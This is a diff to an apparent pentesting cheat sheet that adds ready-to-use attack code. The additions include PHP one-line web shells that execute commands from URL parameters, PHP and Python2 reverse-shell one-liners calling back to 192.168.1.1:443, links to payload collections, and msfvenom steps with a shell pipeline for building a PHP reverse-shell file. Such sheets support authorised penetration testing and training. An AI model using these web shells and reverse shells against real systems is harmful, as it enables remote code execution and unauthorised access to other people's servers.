@@ -13,10 +13,30 @@ Kali ready-to-go webshells
 /usr/share/seclists/Web-Shells/
 
 PHP code for a simple web shell:
+<?=`$_GET[0]`?>
+<?php echo shell_exec($_GET['cmd']); ?
 <?php $cmd=$_GET['cmd']; system($cmd);?>
+
+PHP to immediately pop a shell
+<?php $sock=fsockopen("192.168.1.1",443); exec("/bin/sh -i <&3 >&3 2>&3");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/443 0>&1'");?>
+
+> php -r '$sock=fsockopen("192.168.1.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Python2 code to immediately pop a shell
+> /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-###### List payload options
+###### Ready-to-go payloads
+```
+Nishang
+https://github.com/samratashok/nishang
+
+PayloadsAllTheThings
+https://github.com/swisskyrepo/PayloadsAllTheThings
+```
+
+###### List msfvenom payload options
 ```
 > msfvenom -l payloads | grep php
 > msfvenom -l archs
@@ -36,7 +56,8 @@ Staged payload
 ```
 > msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php
 
-Make sure the file starts with <?php at the first line of the file so that it will execute as a PHP webpage.
+Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage.
+> cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste > shell.php
 ```
 
 ###### .elf reverse shell
